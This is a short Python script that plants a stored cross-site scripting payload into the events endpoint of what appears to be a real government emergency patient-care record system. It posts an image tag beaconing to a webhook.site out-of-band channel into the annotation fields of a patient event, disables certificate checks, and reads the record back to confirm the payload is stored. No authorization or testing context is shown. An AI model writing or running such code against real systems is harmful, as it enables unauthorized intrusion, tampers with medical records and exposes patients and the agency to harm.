#!/usr/bin/env python3
"""
Plant Stored XSS exfil payload in 4001 /events Annotation/TypeOfEventTxt.

OOB channel: https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016
Payload: <img src=https://webhook.site/<uuid>?src=4001-evt-<id>>
"""
import requests, urllib3, json, sys, datetime
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://epcr.tpf.gov.tw:4001/events"
OOB = "https://webhook.site/9938583b-2e29-4de9-8231-ac50b3e44016"
CASE_ID = "180817092350fed7"
RECORD_UUID = f"xss_test_{int(datetime.datetime.now().timestamp())}"

# Step 1: Plant payload
# Use a unique marker per attempt so we know which fired.
marker = "evt" + datetime.datetime.now().strftime("%H%M%S")
payload = f'<img src="{OOB}/{marker}?case={CASE_ID}&uuid={RECORD_UUID}">'
print(f"[*] Planting payload: {payload}")

r = requests.post(TARGET, json={
    "CaseID": CASE_ID,
    "recordUuid": RECORD_UUID,
    "TypeOfEventTxt": payload,
    "Annotation": payload,
    "Systolic": 120,
    "Diastolic": 80,
    "Mean": 90,
    "Hr": 75,
}, verify=False, timeout=10)
print(f"[*] POST status: {r.status_code}")
print(f"[*] Response headers: {dict(r.headers)}")
print(f"[*] Response body: {r.text[:400]}")
loc = r.headers.get('Location', '')
new_id = loc.split('/')[-1] if '/events/' in loc else None
print(f"[*] New event id: {new_id}")

# Step 2: Verify it's readable
print(f"\n[*] GET back: {TARGET}?recordUuid={RECORD_UUID}")
r = requests.get(TARGET, params={'recordUuid': RECORD_UUID}, verify=False, timeout=10)
print(f"[*] GET status: {r.status_code}, length: {len(r.text)}")
print(f"[*] First 400 chars: {r.text[:400]}")
if payload[:50] in r.text:
    print(f"[*] CONFIRMED: payload is stored verbatim — Stored XSS active")
else:
    print(f"[!] WARNING: payload not in GET response — XSS may be escaped")
